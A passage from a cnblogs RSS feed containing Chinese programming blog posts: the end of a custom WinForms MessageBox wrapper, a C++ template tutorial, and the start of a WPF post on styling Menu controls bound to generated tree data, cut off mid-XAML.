    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text, MessageBoxButtons buttons, Form parent)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Show(text, buttons, icon, defaultButton, parent);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;文本&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;caption&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;标题&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;按钮&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;icon&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;图标&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text, MessageBoxButtons buttons, MessageBoxIcon icon)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Show(text, buttons, icon, defaultButton, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;icon&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;parent&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text, MessageBoxButtons buttons, MessageBoxIcon icon, Form parent)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Show(text, buttons, icon, defaultButton, parent);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;icon&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;defaultButton&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text, MessageBoxButtons buttons, MessageBoxIcon icon, MessageBoxDefaultButton defaultButton)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Show(text, buttons, icon, defaultButton, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;文本&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;caption&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;标题&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;按钮&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;icon&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;图标&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;defaultButton&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;默认按钮&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&lt;/span&gt;&lt;span&gt;System.Windows.Forms.DialogResult 值之一&lt;/span&gt;&lt;span&gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt; text, MessageBoxButtons buttons, MessageBoxIcon icon, MessageBoxDefaultButton defaultButton, Form parent, &lt;span&gt;int&lt;/span&gt; pFormWidth = &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;int&lt;/span&gt; pFormHeight = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (frm_MessageBox frm = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; frm_MessageBox(text, caption, buttons, icon, defaultButton))
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (parent == &lt;span&gt;null&lt;/span&gt; ||&lt;span&gt; parent.IsDisposed)
            {
                frm.StartPosition &lt;/span&gt;=&lt;span&gt; FormStartPosition.CenterScreen; 
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pFormWidth != &lt;span&gt;0&lt;/span&gt;) frm.Width =&lt;span&gt; pFormWidth;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pFormHeight != &lt;span&gt;0&lt;/span&gt;) frm.Height =&lt;span&gt; pFormHeight;

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; frm.ShowDialog();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                frm.StartPosition &lt;/span&gt;=&lt;span&gt; FormStartPosition.CenterParent; 
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pFormWidth != &lt;span&gt;0&lt;/span&gt;) frm.Width =&lt;span&gt; pFormWidth;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pFormHeight != &lt;span&gt;0&lt;/span&gt;) frm.Height =&lt;span&gt; pFormHeight;

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; frm.ShowDialog(parent);
            }
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; DialogResult Show(Form parent, MessageBoxModel pMessageBoxModel)
    {
        &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (frm_MessageBox frm = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; frm_MessageBox(pMessageBoxModel))
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (parent == &lt;span&gt;null&lt;/span&gt; ||&lt;span&gt; parent.IsDisposed)
            {
                frm.StartPosition &lt;/span&gt;=&lt;span&gt; FormStartPosition.CenterScreen; 
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pMessageBoxModel.FormWidth != &lt;span&gt;0&lt;/span&gt;) frm.Width =&lt;span&gt; pMessageBoxModel.FormWidth;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pMessageBoxModel.FormHeight != &lt;span&gt;0&lt;/span&gt;) frm.Height =&lt;span&gt; pMessageBoxModel.FormHeight;

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; frm.ShowDialog();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                frm.StartPosition &lt;/span&gt;=&lt;span&gt; FormStartPosition.CenterParent; 
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pMessageBoxModel.FormWidth != &lt;span&gt;0&lt;/span&gt;) frm.Width =&lt;span&gt; pMessageBoxModel.FormWidth;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pMessageBoxModel.FormHeight != &lt;span&gt;0&lt;/span&gt;) frm.Height =&lt;span&gt; pMessageBoxModel.FormHeight;

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; frm.ShowDialog(parent);
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　代码比较简单，创建一个公共类，以及类型Messagebox的方法重载而已！&lt;br/&gt;        最后一步，调用：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; button1_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      KzxMessageBox.Show(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;this is a test!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
      KzxMessageBox.Show(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;This is a test!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, MessageBoxButtons.OKCancel, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　一起看下效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/116076/202003/116076-20200319005341561-1379193228.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/116076/202003/116076-20200319005350547-617333589.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　最后，由于后续所有重写/重绘控件都在同一个项目使用，而且Dev系统引用文件较多，压缩后源码文件仍然很大，如果有需要源码的朋友，可以微信公众号联系博主，源码可以免费赠予~！有疑问的也可以CALL我一起探讨，最最后，如果觉得本篇博文对您或者身边朋友有帮助的，麻烦点个关注！赠人玫瑰，手留余香，您的支持就是我写作最大的动力，感谢您的关注，期待和您一起探讨！再会！&lt;/p&gt;
</description>
<pubDate>Wed, 18 Mar 2020 16:55:00 +0000</pubDate>
<dc:creator>[Stephen-kzx]</dc:creator>
<og:description>很久没有更新博客了，本想着直接发一篇《手撕ERP》系列，从控件重写、重绘，到框架搭建，再到部分模块实现+业务的。但是每次动手的时候，都觉得难以下手。直接从数据库设计开始吧，模块设计还没定下来，从模块设</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/axing/p/12521589.html</dc:identifier>
</item>
<item>
<title>C++总结之template - 醉曦</title>
<link>http://www.cnblogs.com/zuixime0515/p/12521550.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zuixime0515/p/12521550.html</guid>
<description>&lt;p&gt;我们可以把函数模板当做一种特殊的函数，里面的&lt;strong&gt;参数类型可以是任意类型&lt;/strong&gt;，这样的话我们就可以减少重复定义，从而让这个函数模板自动适应不同的参数类型，也就是说函数可以适应多种类型的参数，例如&lt;code&gt;double&lt;/code&gt;、&lt;code&gt;int&lt;/code&gt;或者类什么的。&lt;/p&gt;
&lt;p&gt;C++为了实现上面的功能，引入了&lt;code&gt;template&lt;/code&gt;这个概念。我们可以把template当成是一种特殊的类型参数，并且也可以在函数里当做参数传递，心里面把它当做&lt;code&gt;int&lt;/code&gt;什么的就行了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用类型参数声明函数模板的格式如下所示&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;template &amp;lt;class identifier&amp;gt; function_declaration;
template &amp;lt;typename identifier&amp;gt; function_declaration;    // 这里使用了typename 当做声明类型参数&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面声明函数模板的格式只有一处不同，那就是&lt;code&gt;class&lt;/code&gt;和&lt;code&gt;typename&lt;/code&gt;，在这里其实使用哪一种都没有区别，看自己喜欢就行，C++对此也没有做严格的区分；&lt;/p&gt;
&lt;p&gt;为了更好的说明如何使用函数模板，便在举一个很形象的例子，那就是一个用来返回较大值的函数，具体写法如下所示:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;template &amp;lt;typename T&amp;gt;
T GetMax(T a, T b)
    return a &amp;gt; b ? a : b;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在上面的短短几行代码中我们就创建了一个函数模板用来获取两个数之间较大的那个数，不难看出T在这里并没有指明具体的类型，在这我们仍然可以在心里把它当做普通变量处理，返回值也是T。&lt;/p&gt;
&lt;p&gt;为了使用我们定义的函数模板，可以参照统一的函数模板调用格式：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; function_name&amp;lt;type&amp;gt; (parameters);    // type就是具体的类型，例如int、double这些，parameters就是函数里的参数，也是具体类型&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以，如果我们想要实现获取两个整形值里较大的那个，我们可以传入int这个类型之后调用&lt;code&gt;GetMax&lt;/code&gt;函数，具体示例如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int x = 4;
int y = 2;

int max = GetMax&amp;lt;int&amp;gt; (x, y);    // max = 4&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;由于template声明的类型可以是&lt;strong&gt;任意类型&lt;/strong&gt;，也就是使用的时候传入具体的类型就行。所以可以参考上面函数模板的例子构造类模板也是一样的，在使用这个类的时候传入具体的变量类型就行了。例如下面的类模板定义：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;template &amp;lt;typename T&amp;gt;
class MyPair{
    T value[2];
    
    public:
        MyPair(T first, T second)
        {
            value[0] = first;
            value[1] = second;
        }
  };&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类模板的示例代码中定义一个&lt;code&gt;MyPair&lt;/code&gt;类，&lt;strong&gt;用来存储任意类型的两个元素&lt;/strong&gt;，例如&lt;code&gt;double&lt;/code&gt;，&lt;code&gt;char&lt;/code&gt;，&lt;code&gt;int&lt;/code&gt;等，下面我就给出两个示例，分别存储&lt;code&gt;double&lt;/code&gt;和&lt;code&gt;int&lt;/code&gt;类型的变量&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;MyPair&amp;lt;int&amp;gt; myInt(2, 3);    // 存储两个整型值
MyPair&amp;lt;double&amp;gt; myDouble(2.3, 3.43);    // 存储两个double值&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;模板类的成员函数也可以在&lt;strong&gt;类外定义&lt;/strong&gt;，写法和函数模板的写法是一样的，具体示例如下所示：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;template &amp;lt;class T&amp;gt;
class MyPair {
    T a, b;
  public:
    mypair (T first, T second)
      {a=first; b=second;}
    T Getmax ();
};

template &amp;lt;typename T&amp;gt;
T MyPair&amp;lt;T&amp;gt;::Getmax ()    // 在类外定义函数， 注意前面的写法和函数模板写法一致
{
  T retval;
  retval = a&amp;gt;b? a : b;
  return retval;
}&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;如果我们想要为类模板定义一个不同的实现接口，并且要求需要将特定参数作为参数传递时，那么我们就可以将该&lt;strong&gt;模板特化&lt;/strong&gt;；&lt;/p&gt;
&lt;p&gt;为了更好地说明模板特化，还是举个简单的例子吧。假设我们定义一个类&lt;code&gt;mycontainer&lt;/code&gt;，这个类可以存储一个任意类型的变量，并且这个类还有一个函数叫做&lt;code&gt;increasement&lt;/code&gt;用来将存储的类型加一。并且，如果这个类存储的是一个char类型的时候，我们会发现这个类对于实现将其中的成员变量转换为大写的功能将更加方便，不妨将这个函数定义为&lt;code&gt;ToUpper&lt;/code&gt;，因此，我们可以为char类型的类模板实现模板特化，具体的示例代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;// 模板特化
#include &amp;lt;iostream&amp;gt;
using namespace std;

// 声明类模板:
template &amp;lt;typename T&amp;gt;
class mycontainer {
    T element;
  public:
    mycontainer (T arg) {element=arg;}
    T increase () {return ++element;}
};

// char类型的模板特化:
template &amp;lt;&amp;gt;
class mycontainer&amp;lt;char&amp;gt; {
    char element;
  public:
    mycontainer(char arg) {element=arg;}
    
    char ToUpper()
    {
      if ((element&amp;gt;='a')&amp;amp;&amp;amp;(element&amp;lt;='z'))
      element+='A'-'a';
      return element;
    }
};&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于上面的模板特化，我们需要几点，注意类模板和模板特化的&lt;strong&gt;区别和联系&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在类模板的前面加上&lt;code&gt;template &amp;lt;&amp;gt;&lt;/code&gt;，这表明是模板特化，也就是是说模板特化都需要加上这句话；&lt;/li&gt;
&lt;li&gt;还有一点就是类模板后面使用了&lt;code&gt;&amp;lt;char&amp;gt;&lt;/code&gt;参数，这个特定参数表示我们将模板类特化程&lt;code&gt;&amp;lt;char&amp;gt;&lt;/code&gt;类型；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了以&lt;code&gt;template&lt;/code&gt;或者&lt;code&gt;class&lt;/code&gt;关键字开头声明的表示类型的模板参数之外，template也可以具有其他类型的参数，例如&lt;code&gt;int&lt;/code&gt;、&lt;code&gt;double&lt;/code&gt;这些参数，就类似于一个函数中拥有多个参数，每个参数类型还不一样。为了更好的说明&lt;code&gt;template&lt;/code&gt;的其他用法，不妨参考下面的示例代码，&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#include &amp;lt;iostream&amp;gt;
using namespace std;

template&amp;lt;class T, int N&amp;gt;    // 这里除了含有class声明的类型之外，还拥有一个int类型
class mysequence {
    T memblock [N];
  public:
    void setmember(int x, T value);
    T getmember(int x);
};

template&amp;lt;class T, int N&amp;gt;
void mysequence&amp;lt;T,N&amp;gt;::setmember(int x, T value) {
  memblock[x]=value;
}

template&amp;lt;class T, int N&amp;gt;
T mysequence&amp;lt;T,N&amp;gt;::getmember(int x) {
  return memblock[x];
}

int main(){
  mysequence&amp;lt;int,5&amp;gt; myints;
  mysequence&amp;lt;double,5&amp;gt; myfloats;
  myints.setmember(0,100);
  myfloats.setmember(3,3.1416);
  cout &amp;lt;&amp;lt; myints.getmember(0) &amp;lt;&amp;lt; '\n';
  cout &amp;lt;&amp;lt; myfloats.getmember(3) &amp;lt;&amp;lt; '\n';
  return 0;
}&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Wed, 18 Mar 2020 16:34:00 +0000</pubDate>
<dc:creator>醉曦</dc:creator>
<og:description>函数模板 我们可以把函数模板当做一种特殊的函数，里面的 参数类型可以是任意类型 ，这样的话我们就可以减少重复定义，从而让这个函数模板自动适应不同的参数类型，也就是说函数可以适应多种类型的参数，例如 、</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zuixime0515/p/12521550.html</dc:identifier>
</item>
<item>
<title>wpf 菜单样式和绑定树形数据 - 麦比乌斯皇</title>
<link>http://www.cnblogs.com/hsxian/p/12521501.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hsxian/p/12521501.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;在wpf开发中，经常会使用到Menu和ContentMenu。但是原生的样式比较简陋，对于比较追求界面美好的人来说是十分不友好的。那么，这就涉及到对Menu的样式修改了。与此同时，我们还希望Menu自动Binding到视图数据模型上，根据数据项自动展开MenuItem。接下来就对这些想法做一简单实现。&lt;/p&gt;
&lt;h2 id=&quot;视图模型&quot;&gt;视图模型&lt;/h2&gt;
&lt;p&gt;假设我们的菜单项里有描述意图的缩略图和文字需要展示。那么我们需要有名字和存有图片路径的属性。额外的，还需要一个Children集合来存放子项，以形成树形数据。&lt;/p&gt;
&lt;h3 id=&quot;视图模型class&quot;&gt;视图模型Class&lt;/h3&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public class CommonTreeModel
{
    /// &amp;lt;summary&amp;gt;
    /// 名字
    /// &amp;lt;/summary&amp;gt;
    public string Name { get; set; }
    /// &amp;lt;summary&amp;gt;
    /// 图片的路径
    /// &amp;lt;/summary&amp;gt;
    public string IconPath { get; set; }
    /// &amp;lt;summary&amp;gt;
    /// 子项
    /// &amp;lt;/summary&amp;gt;
    public ObservableCollection&amp;lt;CommonTreeModel&amp;gt; Children { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;数据mock&quot;&gt;数据mock&lt;/h3&gt;
&lt;p&gt;我们使用&lt;code&gt;Bogus&lt;/code&gt;进行模拟数据的产生。使用nuget搜索Bogus添加即可。&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;/// &amp;lt;summary&amp;gt;
/// 菜单项数据集，前端将binding到该属性上
/// &amp;lt;/summary&amp;gt;
public ObservableCollection&amp;lt;CommonTreeModel&amp;gt; MenuTreeSource { get; set; }

private void InitData()
{
    var general = new Bogus.Faker&amp;lt;CommonTreeModel&amp;gt;()
        .RuleFor(t =&amp;gt; t.Name, t =&amp;gt; t.Commerce.Product())//名字：商业产品
        .RuleFor(t =&amp;gt; t.IconPath, t =&amp;gt; t.Image.LoremFlickrUrl(32, 32));//图片：使用LoremFlick网站的图片
    var rd = new Random(DateTime.Now.Millisecond);//随机数
    MenuTreeSource = GenerateTreeData(general, rd, 10, 3, 10);
}

private ObservableCollection&amp;lt;CommonTreeModel&amp;gt; GenerateTreeData(Faker&amp;lt;CommonTreeModel&amp;gt; faker, Random rd, int topCount, int subMin, int subMaxm, int level = 0, int levelLimit = 4)
{
    var list = new ObservableCollection&amp;lt;CommonTreeModel&amp;gt;(faker.Generate(level == 0 ? topCount : rd.Next(subMin, subMaxm)));
    level++;
    if (level &amp;lt; levelLimit)
    {
        foreach (var item in list)
        {
            if (rd.Next() % 2 == 0)
            {
                item.Children = GenerateTreeData(faker, rd, topCount, subMin, subMaxm, level, levelLimit);
            }
        }
    }
    return list;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;到这里，我们生成了最大层级可能为4的一棵树：&lt;code&gt;MenuTreeSource&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;我们先写前端Menu绑定到数据。&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Menu ItemsSource=&quot;{Binding MenuTreeSource}&quot; HorizontalAlignment=&quot;Center&quot;&amp;gt;
    &amp;lt;Menu.ItemTemplate&amp;gt;
        &amp;lt;HierarchicalDataTemplate ItemsSource=&quot;{Binding Children}&quot;&amp;gt;
            &amp;lt;Label Content=&quot;{Binding Name}&quot;&amp;gt;&amp;lt;/Label&amp;gt;
        &amp;lt;/HierarchicalDataTemplate&amp;gt;
    &amp;lt;/Menu.ItemTemplate&amp;gt;
&amp;lt;/Menu&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;原始的样式展示效果如下，总共有四级，并且第一级和后三级不一致。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1214143/202003/1214143-20200319001306874-1894530029.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;我们只需重写MenuItem的样式，就能够改变菜单的展示效果：&lt;/p&gt;
&lt;pre class=&quot;xml&quot;&gt;
&lt;code&gt;&amp;lt;Style TargetType=&quot;MenuItem&quot;&amp;gt;
    &amp;lt;Setter Property=&quot;FontSize&quot; Value=&quot;20&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
    &amp;lt;Setter Property=&quot;Foreground&quot; Value=&quot;#b8d00a&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
    &amp;lt;Setter Property=&quot;Template&quot;&amp;gt;
        &amp;lt;Setter.Value&amp;gt;
            &amp;lt;ControlTemplate&amp;gt;
                &amp;lt;Grid&amp;gt;
                    &amp;lt;Grid.Style&amp;gt;
                        &amp;lt;Style TargetType=&quot;Grid&quot;&amp;gt;
                            &amp;lt;Setter Property=&quot;Background&quot; Value=&quot;#b8d00a&quot;/&amp;gt;
                            &amp;lt;Style.Triggers&amp;gt;
                                &amp;lt;Trigger Property=&quot;IsMouseOver&quot; Value=&quot;True&quot;&amp;gt;
                                    &amp;lt;Setter Property=&quot;Background&quot; Value=&quot;#f46a56&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
                                &amp;lt;/Trigger&amp;gt;
                            &amp;lt;/Style.Triggers&amp;gt;
                        &amp;lt;/Style&amp;gt;
                    &amp;lt;/Grid.Style&amp;gt;
                    &amp;lt;Grid.ColumnDefinitions&amp;gt;
                        &amp;lt;ColumnDefinition Width=&quot;auto&quot;&amp;gt;&amp;lt;/ColumnDefinition&amp;gt;
                        &amp;lt;ColumnDefinition Width=&quot;*&quot;&amp;gt;&amp;lt;/ColumnDefinition&amp;gt;
                        &amp;lt;ColumnDefinition Width=&quot;auto&quot;&amp;gt;&amp;lt;/ColumnDefinition&amp;gt;
                    &amp;lt;/Grid.ColumnDefinitions&amp;gt;
                    &amp;lt;Image Width=&quot;32&quot; Height=&quot;32&quot; Margin=&quot;5&quot; Source=&quot;{Binding IconPath}&quot; /&amp;gt;
                    &amp;lt;Label Content=&quot;{Binding Name}&quot; Margin=&quot;10 0&quot; Grid.Column=&quot;1&quot; VerticalContentAlignment=&quot;Center&quot;/&amp;gt;
                    &amp;lt;Label Name=&quot;MoreLbl&quot; Content=&quot;&amp;gt;&amp;gt;&quot; Grid.Column=&quot;2&quot; VerticalContentAlignment=&quot;Center&quot;&amp;gt;
                        &amp;lt;Label.Style&amp;gt;
                            &amp;lt;Style TargetType=&quot;Label&quot;&amp;gt;
                                &amp;lt;Setter Property=&quot;Visibility&quot; Value=&quot;Visible&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
                                &amp;lt;Style.Triggers&amp;gt;
                                    &amp;lt;DataTrigger Binding=&quot;{Binding Children}&quot; Value=&quot;{x:Null}&quot;&amp;gt;
                                        &amp;lt;Setter Property=&quot;Visibility&quot; Value=&quot;Collapsed&quot;&amp;gt;&amp;lt;/Setter&amp;gt;
                                    &amp;lt;/DataTrigger&amp;gt;
                                &amp;lt;/Style.Triggers&amp;gt;
                            &amp;lt;/Style&amp;gt;
                        &amp;lt;/Label.Style&amp;gt;
                    &amp;lt;/Label&amp;gt;
                    &amp;lt;Popup AllowsTransparency=&quot;True&quot;
                        IsOpen=&quot;{Binding Path=IsSubmenuOpen, RelativeSource={RelativeSource TemplatedParent}}&quot;
                        Placement=&quot;Right&quot; x:Name=&quot;SubMenuPopup&quot; Focusable=&quot;false&quot;&amp;gt;
